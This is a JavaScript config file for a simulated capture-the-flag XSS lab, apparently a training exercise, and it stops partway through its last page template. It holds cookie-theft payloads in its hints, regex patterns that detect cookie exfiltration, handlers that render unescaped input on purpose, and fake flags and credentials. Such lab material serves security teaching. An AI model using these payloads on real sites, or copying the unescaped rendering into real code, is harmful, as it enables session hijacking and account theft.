/* ============================================================
   CTF ARENA — Box A2: The Whispering Wall
   Cross-Site Scripting (XSS) | Obsidian Hand
   Config: web app, XSS engine, filesystem, flags, hints, lore
   ============================================================ */

const A2Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Whispering Wall',
    subtitle: 'Cross-Site Scripting — Obsidian Hand',

    // Tutorial mode (AR-12)
    tutorialMode: true,
    tutorial: {
            "steps": [
                    {
                            "title": "Scan the target network",
                            "tip": "Run nmap to discover the web server and any other services running on the target.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "cmd": "contains:nmap"
                                    }
                            }
                    },
                    {
                            "title": "Explore the web application",
                            "tip": "Browse the target site. Look for user input fields, comment sections, or search bars.",
                            "trigger": {
                                    "event": "navigate"
                            }
                    },
                    {
                            "title": "Test for XSS vulnerabilities",
                            "tip": "Try injecting <script> tags or event handlers into input fields. Watch if your code executes.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "phase": "EXPLOIT"
                                    },
                                    "alt": [
                                            {
                                                    "event": "command",
                                                    "match": {
                                                            "cmd": "contains:script"
                                                    }
                                            },
                                            {
                                                    "event": "command",
                                                    "match": {
                                                            "cmd": "contains:alert"
                                                    }
                                            }
                                    ]
                            }
                    },
                    {
                            "title": "Capture the user flag",
                            "tip": "Use your XSS to steal session tokens, cookies, or extract hidden data.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "user"
                                    }
                            }
                    },
                    {
                            "title": "Escalate to root",
                            "tip": "Leverage the stolen credentials or session to access admin functionality.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "root"
                                    }
                            }
                    }
            ]
    },
    difficulty: 'Beginner-Intermediate',
    accent: '#e67e22',
    storageKey: 'hexworth_ctf_a2',
    trackerKey: 'ctf_a2',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Identify the target\'s attack surface. Scan open ports, fingerprint services, and map the web application structure.',
            requiredFlags: [],
            mitre: ['T1046', 'T1595.002', 'T1592.004'],
            unlocks: ['enumeration'],
            locked: false
        },
        {
            id: 'enumeration',
            name: 'Web Enumeration',
            icon: '\uD83C\uDF10',
            description: 'Explore the web application. Discover input fields, endpoints, and test whether the application sanitizes user-controlled data.',
            requiredFlags: [],
            mitre: ['T1190', 'T1083'],
            unlocks: ['exploitation'],
            locked: true
        },
        {
            id: 'exploitation',
            name: 'XSS Exploitation',
            icon: '\uD83D\uDC89',
            description: 'Inject malicious scripts into the message board and search parameter. Execute cookie-theft payloads to hijack the admin session.',
            requiredFlags: ['user'],
            mitre: ['T1059.007', 'T1185', 'T1189'],
            unlocks: ['persistence'],
            locked: true
        },
        {
            id: 'persistence',
            name: 'Session Hijack & Escalation',
            icon: '\uD83D\uDD13',
            description: 'Use the stolen admin session token to authenticate to the admin panel. Enumerate privileged endpoints and extract server configuration secrets.',
            requiredFlags: ['root'],
            mitre: ['T1539', 'T1078', 'T1213'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.4', description: 'Given a scenario, analyze indicators of malicious activity', skill: 'Reflected XSS Detection' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze indicators of malicious activity', skill: 'Stored XSS Server Compromise' },
            { flagId: 'user', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Injection attacks (XSS)', skill: 'Cross-Site Scripting Injection' },
            { flagId: 'user', objective: '2.8', description: 'Summarize the basics of cryptographic concepts — Application security controls', skill: 'Input Validation and Output Encoding' },
            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources — Web application hardening', skill: 'Content Security Policy and XSS Mitigations' },
            { flagId: 'root', objective: '2.3', description: 'Explain the importance of security concepts in an enterprise environment — Web application vulnerabilities', skill: 'Session Token Theft via XSS' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.10.14.8\n'
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', value: 'flag{wh1sp3r1ng_w4ll_x55_r3fl3ct3d}', points: 100 },
        { id: 'root', value: 'flag{0bs1d14n_h4nd_s3rv3r_c0mpr0m1s3d}', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        hintPenalty: -50,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 }  // 15 minutes
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: "The message wall doesn't sanitize HTML. Try posting <b>test</b> to see if it renders as bold.",
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: "If HTML renders, try injecting a <script> tag. XSS lets you steal cookies and session tokens.",
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: "Cookie-theft payloads like <script>document.cookie</script> or <img src=x onerror=alert(document.cookie)> can reveal admin tokens.",
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: "Use the admin token to access /wall/admin/. The admin panel has the user flag, and /wall/admin/config has the root flag.",
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The Obsidian Hand runs a clandestine community board — The Whispering Wall — where operatives coordinate in the open. Intel suggests the application was deployed without a security review and the XSS filter was silently disabled for "performance." Your mission: exploit the unsanitized message board, steal the admin\'s session token, and exfiltrate server configuration secrets.',
        scenario: 'A contract developer built the Whispering Wall in under two weeks to meet a hard deadline imposed by Obsidian Hand leadership. The security team filed a review request; it was never scheduled. The developer disabled the XSS filter in server.conf because it was "causing rendering glitches" in a demo. The CSP header was never set. No one checked the git diff before it went live.',
        outro: 'The Whispering Wall has been compromised. By exploiting unsanitized user input, you stole the admin token from the Obsidian Hand\'s community board and gained full access to their server configuration. The walls have ears... and now, so do you.',
        ecer: {
            executive: 'Obsidian Hand leadership imposed an unrealistic two-week deadline and did not require a security sign-off before deployment — velocity was treated as the only metric that mattered.',
            culture: 'No secure development lifecycle (SDLC) existed. Security review requests were optional and deprioritized. Disabling security controls to fix demo glitches was normalized without a change-control process.',
            employee: 'The developer disabled xss_filter and never set a Content-Security-Policy header, reflecting a gap in secure coding awareness — not malice. No peer review caught the configuration change.',
            regulatory: 'The organization had no compliance framework mandating input sanitization testing or web application firewall (WAF) enforcement, leaving the application exposed with zero compensating controls.'
        }
    },

    // ═══════════════════════════════════════════════════════
    // XSS STATE MACHINE
    // ═══════════════════════════════════════════════════════

    _state: {
        posts: [
            { name: 'Cipher_Ghost', message: 'The northern perimeter sensors are offline again. Third time this cycle. Anyone from maintenance sector reading this?' },
            { name: 'Vex_Null', message: 'Obsidian Hand recruitment begins at midnight. Prove your worth or stay in the shadows.' },
            { name: 'Signal_Wraith', message: 'Patched the auth module on Gate 4. Should hold until next quarter. Do NOT restart the daemon.' }
        ],
        xssTriggered: false,
        adminTokenRevealed: false,
        adminAuthenticated: false
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — The Whispering Wall
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.10.14.8/wall/',

        pages: {

            // ── Main Message Board ──────────────────────────
            '/wall/': {
                title: 'The Whispering Wall',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #444;">
                        <h1 style="color:#e67e22; font-size:1.6rem; font-family:Georgia,serif; margin-bottom:4px;">&#128483; The Whispering Wall</h1>
                        <div style="color:#888; font-size:0.8rem;">Obsidian Hand &mdash; Community Message Board v3.2.1</div>
                    </div>

                    <div style="max-width:620px; margin:0 auto 24px;">
                        <div style="color:#aaa; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px;">RECENT POSTS</div>
                        <div data-posts>
                            <div style="background:#1a1a2e; border:1px solid #333; border-radius:4px; padding:10px 14px; margin-bottom:8px;">
                                <div style="color:#e67e22; font-size:0.75rem; font-weight:700; margin-bottom:4px;">Cipher_Ghost</div>
                                <div style="color:#ccc; font-size:0.8rem;">The northern perimeter sensors are offline again. Third time this cycle. Anyone from maintenance sector reading this?</div>
                            </div>
                            <div style="background:#1a1a2e; border:1px solid #333; border-radius:4px; padding:10px 14px; margin-bottom:8px;">
                                <div style="color:#e67e22; font-size:0.75rem; font-weight:700; margin-bottom:4px;">Vex_Null</div>
                                <div style="color:#ccc; font-size:0.8rem;">Obsidian Hand recruitment begins at midnight. Prove your worth or stay in the shadows.</div>
                            </div>
                            <div style="background:#1a1a2e; border:1px solid #333; border-radius:4px; padding:10px 14px; margin-bottom:8px;">
                                <div style="color:#e67e22; font-size:0.75rem; font-weight:700; margin-bottom:4px;">Signal_Wraith</div>
                                <div style="color:#ccc; font-size:0.8rem;">Patched the auth module on Gate 4. Should hold until next quarter. Do NOT restart the daemon.</div>
                            </div>
                        </div>
                    </div>

                    <div style="max-width:620px; margin:0 auto;">
                        <div style="color:#aaa; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px;">POST A MESSAGE</div>
                        <div style="display:flex; flex-direction:column; gap:8px;">
                            <input type="text" data-field="name" placeholder="Your handle..."
                                   style="padding:8px 14px; border:1px solid #444; border-radius:4px; font-family:inherit; font-size:0.85rem; background:#111; color:#eee;">
                            <textarea data-field="message" placeholder="Write your message..." rows="3"
                                      style="padding:8px 14px; border:1px solid #444; border-radius:4px; font-family:inherit; font-size:0.85rem; background:#111; color:#eee; resize:vertical;"></textarea>
                            <button data-action="post"
                                    style="padding:8px 20px; background:#e67e22; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; cursor:pointer; align-self:flex-end;">Post Message</button>
                        </div>
                    </div>

                    <div data-results style="max-width:620px; margin:16px auto 0;"></div>
                `,
                formHandler: function(data, engine) {
                    return A2Config._handlePost(data, engine);
                }
            },

            // ── Search Posts (Reflected XSS) ────────────────
            '/wall/search': {
                title: 'Search — The Whispering Wall',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #444;">
                        <h1 style="color:#e67e22; font-size:1.4rem; font-family:Georgia,serif; margin-bottom:4px;"><img src="/assets/images/icons/icon-magnifier.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> Search the Wall</h1>
                        <div style="color:#888; font-size:0.8rem;">Find posts by keyword</div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 20px;">
                        <div style="display:flex; gap:8px;">
                            <input type="text" data-field="query" placeholder="Search posts..."
                                   style="flex:1; padding:8px 14px; border:1px solid #444; border-radius:4px; font-family:inherit; font-size:0.85rem; background:#111; color:#eee;">
                            <button data-action="search"
                                    style="padding:8px 20px; background:#e67e22; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; cursor:pointer;">Search</button>
                        </div>
                    </div>

                    <div data-results style="max-width:620px; margin:0 auto;"></div>
                `,
                formHandler: function(data, engine) {
                    return A2Config._handleSearch(data, engine);
                }
            },

            // ── Admin Panel (Auth Required) ─────────────────
            '/wall/admin/': {
                title: 'Admin — The Whispering Wall',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #444;">
                        <h1 style="color:#e67e22; font-size:1.4rem; font-family:Georgia,serif; margin-bottom:4px;"><img src="/assets/images/icons/icon-padlock.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> Admin Panel</h1>
                        <div style="color:#888; font-size:0.8rem;">Obsidian Hand &mdash; Restricted Access</div>
                    </div>

                    <div style="max-width:500px; margin:0 auto;" data-admin-gate>
                        <div style="background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.2); border-radius:6px; padding:20px; text-align:center; margin-bottom:20px;">
                            <div style="color:#e74c3c; font-size:1.1rem; font-weight:700; margin-bottom:6px;">Access Denied</div>
                            <div style="color:#999; font-size:0.8rem;">Admin token required. Enter your authentication token below.</div>
                        </div>
                        <div style="display:flex; gap:8px;">
                            <input type="text" data-field="token" placeholder="Enter admin token..."
                                   style="flex:1; padding:8px 14px; border:1px solid #444; border-radius:4px; font-family:monospace; font-size:0.85rem; background:#111; color:#eee;">
                            <button data-action="authenticate"
                                    style="padding:8px 20px; background:#e67e22; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; cursor:pointer;">Login</button>
                        </div>
                    </div>

                    <div data-results style="max-width:620px; margin:16px auto 0;"></div>
                `,
                formHandler: function(data, engine) {
                    return A2Config._handleAdminAuth(data, engine);
                }
            },

            // ── Server Configuration (Post-Auth) ────────────
            '/wall/admin/config': {
                title: 'Server Config — The Whispering Wall',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #444;">
                        <h1 style="color:#e67e22; font-size:1.4rem; font-family:Georgia,serif; margin-bottom:4px;"><img src="/assets/images/icons/icon-gear.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> Server Configuration</h1>
                        <div style="color:#888; font-size:0.8rem;">Obsidian Hand &mdash; Infrastructure Settings</div>
                    </div>

                    <div data-config-content style="max-width:620px; margin:0 auto;"></div>
                    <div data-results style="max-width:620px; margin:16px auto 0;"></div>
                `,
                formHandler: function(data, engine) {
                    // No form interaction needed — content rendered on page load via onLoad
                    return '';
                },
                onLoad: function(engine) {
                    return A2Config._renderConfigPage();
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // XSS ENGINE — Post Handler (Stored XSS)
    // ═══════════════════════════════════════════════════════

    _handlePost(data, engine) {
        const name = (data.name || '').trim();
        const message = (data.message || '').trim();

        if (!name && !message) {
            return '<div style="color:#888; padding:10px; text-align:center; font-size:0.8rem;">Please enter a name and message.</div>';
        }
        if (!message) {
            return '<div style="color:#888; padding:10px; text-align:center; font-size:0.8rem;">Message cannot be empty.</div>';
        }

        const displayName = name || 'Anonymous';

        // ── Check for XSS payloads in the message ──
        const xssResult = A2Config._detectXSS(message);

        // Add the post to state (shows the message renders unsanitized)
        A2Config._state.posts.push({ name: displayName, message: message });

        // Build the new post HTML (intentionally renders HTML — that's the vulnerability)
        let postHtml = `
            <div style="background:#1a2e1a; border:1px solid #2ecc71; border-radius:4px; padding:10px 14px; margin-bottom:12px;">
                <div style="color:#2ecc71; font-size:0.75rem; font-weight:700; margin-bottom:4px;">${displayName} <span style="color:#555; font-weight:400;">&mdash; just now</span></div>
                <div style="color:#ccc; font-size:0.8rem;">${message}</div>
            </div>
            <div style="color:#2ecc71; background:rgba(46,204,113,0.08); border:1px solid rgba(46,204,113,0.2); border-radius:4px; padding:8px; font-size:0.75rem;">
                Message posted successfully.
            </div>`;

        // ── XSS detection feedback ──
        if (xssResult.type === 'html') {
            postHtml += `
                <div style="color:#3498db; background:rgba(52,152,219,0.08); border:1px solid rgba(52,152,219,0.2); border-radius:4px; padding:10px; margin-top:10px; font-size:0.8rem;">
                    <strong>Interesting...</strong> Your HTML tags rendered directly in the page. The application does not sanitize user input.
                </div>`;
        }

        if (xssResult.type === 'xss') {
            A2Config._state.xssTriggered = true;
            postHtml += `
                <div style="color:#e74c3c; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.2); border-radius:4px; padding:12px; margin-top:10px; font-size:0.8rem;">
                    <div style="font-size:1rem; margin-bottom:6px;"><img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> XSS Detected!</div>
                    <strong>Your script executed on the server.</strong> The message board has a stored Cross-Site Scripting vulnerability.
                    Any JavaScript injected into posts will execute for every user who views the wall.
                </div>`;
        }

        if (xssResult.type === 'cookie') {
            A2Config._state.xssTriggered = true;
            A2Config._state.adminTokenRevealed = true;
            postHtml += `
                <div style="color:#e74c3c; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.2); border-radius:4px; padding:12px; margin-top:10px; font-size:0.8rem;">
                    <div style="font-size:1rem; margin-bottom:6px;"><img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> XSS — Cookie Theft Successful!</div>
                    <strong>Intercepted session data from admin user browsing the wall:</strong>
                    <div style="background:#0a0a0a; border:1px solid #333; border-radius:3px; padding:8px; margin-top:8px; font-family:monospace; font-size:0.8rem; color:#2ecc71; word-break:break-all;">
                        session_token=OBS-4dm1n-T0k3n-7742; user=admin; role=administrator; path=/wall/admin/
                    </div>
                    <div style="color:#999; font-size:0.75rem; margin-top:6px;">The admin user viewed your malicious post. Their session cookie has been exfiltrated to your listener.</div>
                </div>`;
        }

        if (xssResult.type === 'event') {
            A2Config._state.xssTriggered = true;
            A2Config._state.adminTokenRevealed = true;
            postHtml += `
                <div style="color:#e74c3c; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.2); border-radius:4px; padding:12px; margin-top:10px; font-size:0.8rem;">
                    <div style="font-size:1rem; margin-bottom:6px;"><img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> XSS — Event Handler Triggered!</div>
                    <strong>The onerror/onload event handler executed, stealing cookies:</strong>
                    <div style="background:#0a0a0a; border:1px solid #333; border-radius:3px; padding:8px; margin-top:8px; font-family:monospace; font-size:0.8rem; color:#2ecc71; word-break:break-all;">
                        session_token=OBS-4dm1n-T0k3n-7742; user=admin; role=administrator; path=/wall/admin/
                    </div>
                    <div style="color:#999; font-size:0.75rem; margin-top:6px;">Image tag with event handler bypassed any script filters. Cookie exfiltrated.</div>
                </div>`;
        }

        return postHtml;
    },

    // ═══════════════════════════════════════════════════════
    // XSS ENGINE — Search Handler (Reflected XSS)
    // ═══════════════════════════════════════════════════════

    _handleSearch(data, engine) {
        const query = (data.query || '').trim();

        if (!query) {
            return '<div style="color:#888; padding:10px; text-align:center; font-size:0.8rem;">Enter a search term.</div>';
        }

        // ── Check for XSS in search query (reflected) ──
        const xssResult = A2Config._detectXSS(query);

        // "Showing results for:" reflects input directly (the vulnerability)
        let html = `
            <div style="color:#aaa; font-size:0.75rem; margin-bottom:12px;">
                Showing results for: <span style="color:#e67e22;">${query}</span>
            </div>`;

        // ── XSS detection in reflected context ──
        if (xssResult.type === 'xss') {
            A2Config._state.xssTriggered = true;
            html += `
                <div style="color:#e74c3c; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.2); border-radius:4px; padding:12px; margin-top:10px; font-size:0.8rem;">
                    <div style="font-size:1rem; margin-bottom:6px;"><img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> Reflected XSS Detected!</div>
                    <strong>Your script was reflected back and executed.</strong> The search parameter is rendered directly into the page without sanitization.
                    This is a reflected Cross-Site Scripting vulnerability.
                </div>`;
            return html;
        }

        if (xssResult.type === 'cookie' || xssResult.type === 'event') {
            A2Config._state.xssTriggered = true;
            A2Config._state.adminTokenRevealed = true;
            html += `
                <div style="color:#e74c3c; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.2); border-radius:4px; padding:12px; margin-top:10px; font-size:0.8rem;">
                    <div style="font-size:1rem; margin-bottom:6px;"><img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> Reflected XSS — Cookie Theft!</div>
                    <strong>The reflected payload executed and captured session data:</strong>
                    <div style="background:#0a0a0a; border:1px solid #333; border-radius:3px; padding:8px; margin-top:8px; font-family:monospace; font-size:0.8rem; color:#2ecc71; word-break:break-all;">
                        session_token=OBS-4dm1n-T0k3n-7742; user=admin; role=administrator; path=/wall/admin/
                    </div>
                    <div style="color:#999; font-size:0.75rem; margin-top:6px;">When an admin clicks a crafted link with this payload, their token is leaked.</div>
                </div>`;
            return html;
        }

        if (xssResult.type === 'html') {
            html += `
                <div style="color:#3498db; background:rgba(52,152,219,0.08); border:1px solid rgba(52,152,219,0.2); border-radius:4px; padding:10px; margin-top:10px; font-size:0.8rem;">
                    <strong>Interesting...</strong> HTML tags in the search query rendered in the results. The search parameter is not sanitized.
                </div>`;
        }

        // ── Normal search: filter posts by keyword ──
        const lower = query.toLowerCase();
        const matches = A2Config._state.posts.filter(p =>
            p.name.toLowerCase().includes(lower) || p.message.toLowerCase().includes(lower)
        );

        if (matches.length > 0) {
            matches.forEach(p => {
                html += `
                    <div style="background:#1a1a2e; border:1px solid #333; border-radius:4px; padding:10px 14px; margin-bottom:8px;">
                        <div style="color:#e67e22; font-size:0.75rem; font-weight:700; margin-bottom:4px;">${A2Config._escHtml(p.name)}</div>
                        <div style="color:#ccc; font-size:0.8rem;">${A2Config._escHtml(p.message)}</div>
                    </div>`;
            });
        } else {
            html += '<div style="color:#888; padding:10px; text-align:center; font-size:0.8rem;">No posts matching your search.</div>';
        }

        return html;
    },

    // ═══════════════════════════════════════════════════════
    // XSS ENGINE — Payload Detection
    // ═══════════════════════════════════════════════════════

    _detectXSS(input) {
        const lower = input.toLowerCase();

        // ── Cookie-theft patterns (highest priority) ──
        if (/document\.cookie/.test(lower) ||
            /new\s+image\(\)\.src\s*=/.test(lower) ||
            /fetch\s*\(/.test(lower) && /cookie/.test(lower) ||
            /xmlhttprequest/.test(lower) && /cookie/.test(lower)) {
            return { type: 'cookie' };
        }

        // ── Event handler XSS (<img src=x onerror=...>, <svg onload=...>) ──
        if (/\bon(error|load|click|mouseover|focus)\s*=/i.test(input)) {
            // Check if it also tries to steal cookies
            if (/document\.cookie/.test(lower) || /cookie/.test(lower)) {
                return { type: 'cookie' };
            }
            return { type: 'event' };
        }

        // ── Script tag XSS ──
        if (/<script[\s>]/i.test(input) || /<\/script>/i.test(input)) {
            // Check if it contains cookie-theft
            if (/document\.cookie/.test(lower) || /cookie/.test(lower)) {
                return { type: 'cookie' };
            }
            return { type: 'xss' };
        }

        // ── JavaScript URI schemes ──
        if (/javascript\s*:/i.test(input)) {
            if (/document\.cookie/.test(lower)) {
                return { type: 'cookie' };
            }
            return { type: 'xss' };
        }

        // ── Plain HTML injection (but not XSS) ──
        if (/<[a-z][a-z0-9]*[\s>]/i.test(input) && !/<(br|hr)\s*\/?>/i.test(input)) {
            return { type: 'html' };
        }

        return { type: 'none' };
    },

    // ═══════════════════════════════════════════════════════
    // ADMIN AUTH HANDLER
    // ═══════════════════════════════════════════════════════

    _handleAdminAuth(data, engine) {
        const token = (data.token || '').trim();

        if (!token) {
            return '<div style="color:#888; padding:10px; text-align:center; font-size:0.8rem;">Please enter an admin token.</div>';
        }

        if (token === 'OBS-4dm1n-T0k3n-7742') {
            A2Config._state.adminAuthenticated = true;
            return `
                <div style="color:#2ecc71; background:rgba(46,204,113,0.08); border:1px solid rgba(46,204,113,0.2); border-radius:4px; padding:12px; margin-bottom:16px; font-size:0.8rem;">
                    <strong>Authentication successful.</strong> Welcome, Administrator.
                </div>

                <div style="color:#aaa; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px;">ADMIN DASHBOARD</div>

                <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:20px;">
                    <div style="background:#1a1a2e; border:1px solid #333; border-radius:4px; padding:14px;">
                        <div style="color:#e67e22; font-size:0.75rem; font-weight:700;">Total Posts</div>
                        <div style="color:#eee; font-size:1.4rem; font-weight:700; margin-top:4px;">${A2Config._state.posts.length}</div>
                    </div>
                    <div style="background:#1a1a2e; border:1px solid #333; border-radius:4px; padding:14px;">
                        <div style="color:#e67e22; font-size:0.75rem; font-weight:700;">Active Users</div>
                        <div style="color:#eee; font-size:1.4rem; font-weight:700; margin-top:4px;">47</div>
                    </div>
                    <div style="background:#1a1a2e; border:1px solid #333; border-radius:4px; padding:14px;">
                        <div style="color:#e67e22; font-size:0.75rem; font-weight:700;">Flagged Posts</div>
                        <div style="color:#eee; font-size:1.4rem; font-weight:700; margin-top:4px;">3</div>
                    </div>
                    <div style="background:#1a1a2e; border:1px solid #333; border-radius:4px; padding:14px;">
                        <div style="color:#e67e22; font-size:0.75rem; font-weight:700;">Server Status</div>
                        <div style="color:#2ecc71; font-size:1.4rem; font-weight:700; margin-top:4px;">Online</div>
                    </div>
                </div>

                <div style="color:#aaa; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px;">USER MANAGEMENT</div>
                ${A2Config._tableHtml(
                    ['ID', 'Username', 'Role', 'Status'],
                    [
                        [1, 'admin', 'Administrator', '<span style="color:#2ecc71;">Active</span>'],
                        [2, 'Cipher_Ghost', 'Moderator', '<span style="color:#2ecc71;">Active</span>'],
                        [3, 'Vex_Null', 'Member', '<span style="color:#2ecc71;">Active</span>'],
                        [4, 'Signal_Wraith', 'Member', '<span style="color:#2ecc71;">Active</span>'],
                        [5, 'Phantom_Byte', 'Member', '<span style="color:#e74c3c;">Banned</span>']
                    ]
                )}

                <!-- Admin Notes: user flag stored in /var/www/user.txt -->
                <!-- flag{wh1sp3r1ng_w4ll_x55_r3fl3ct3d} -->

                <div style="margin-top:16px;">
                    <a href="/wall/admin/config" style="color:#e67e22; font-size:0.8rem;"><img src="/assets/images/icons/icon-gear.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> Server Configuration</a>
                </div>`;
        }

        return `
            <div style="color:#e74c3c; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.2); border-radius:4px; padding:12px; font-size:0.8rem;">
                <strong>Authentication failed.</strong> Invalid token. This attempt has been logged.
            </div>`;
    },

    // ═══════════════════════════════════════════════════════
    // SERVER CONFIG PAGE RENDERER
    // ═══════════════════════════════════════════════════════

    _renderConfigPage() {
        if (!A2Config._state.adminAuthenticated) {
            return `
                <div style="background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.2); border-radius:6px; padding:20px; text-align:center;">
                    <div style="color:#e74c3c; font-size:1.1rem; font-weight:700; margin-bottom:6px;">Access Denied</div>
                    <div style="color:#999; font-size:0.8rem;">You must authenticate via <a href="/wall/admin/" style="color:#e67e22;">/wall/admin/</a> first.</div>
                </div>`;
        }

        return `
            <div style="color:#2ecc71; background:rgba(46,204,113,0.08); border:1px solid rgba(46,204,113,0.2); border-radius:4px; padding:8px; margin-bottom:16px; font-size:0.75rem;">
                Authenticated as: <strong>admin</strong> &mdash; Full access granted
            </div>

            <div style="color:#aaa; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px;">SERVER CONFIGURATION</div>

            <div style="background:#0a0a0a; border:1px solid #333; border-radius:4px; padding:14px; font-family:monospace; font-size:0.75rem; color:#aaa; line-height:1.6; margin-bottom:16px;">
                <div style="color:#555;">## /etc/whispering-wall/server.conf</div>
                <div><span style="color:#e67e22;">server_name</span> = wall.obsidian-hand.net</div>
                <div><span style="color:#e67e22;">listen_port</span> = 80</div>
                <div><span style="color:#e67e22;">ssl_port</span> = 443</div>
                <div><span style="color:#e67e22;">document_root</span> = /var/www/wall</div>
                <div><span style="color:#e67e22;">db_host</span> = 127.0.0.1</div>
                <div><span style="color:#e67e22;">db_name</span> = whispering_wall_db</div>
                <div><span style="color:#e67e22;">db_user</span> = wall_app</div>
                <div><span style="color:#e67e22;">db_pass</span> = Obs1d14n_DB_2024!</div>
                <div><span style="color:#e67e22;">admin_email</span> = admin@obsidian-hand.net</div>
                <div><span style="color:#e67e22;">log_level</span> = warn</div>
                <div><span style="color:#e67e22;">xss_filter</span> = disabled</div>
                <div><span style="color:#e67e22;">csp_header</span> = none</div>
                <div style="color:#555;">## Security note: XSS filter disabled for "performance"</div>
            </div>

            <div style="color:#aaa; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px;">SYSTEM FLAGS</div>

